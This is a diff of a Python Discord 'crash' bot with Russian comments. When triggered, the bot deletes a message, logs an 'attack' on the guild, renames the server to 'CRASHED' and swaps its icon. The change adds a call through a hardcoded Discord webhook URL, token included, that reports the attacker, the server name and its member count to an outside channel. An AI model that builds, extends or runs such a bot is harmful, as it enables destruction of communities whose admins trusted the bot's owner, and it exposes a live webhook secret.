@@ -3,11 +3,12 @@ import asyncio
 from discord.ext import commands
 import os
 token = os.environ.get('TOKENZ') #токен
+from discord_webhook import DiscordWebhook
 print('Ожидание входа...')
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.3'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.4'))
 		
 	async def on_message(self, message):
 		c = 0
@@ -36,6 +37,8 @@ class MyClient(discord.Client):
 				await message.delete() #удаление сообщения
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
+				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/745515368168030259/oxNz2pe5ezZRWu6MPtDFTvHr5PG55lJGKAJO90k865SuHRFPfgfEjT8KoKyFx6MZZFqH', content='**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
+				response = webhook.execute()
 				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
 				with open('chaos.jpeg', 'rb') as f:
 					icon = f.read()
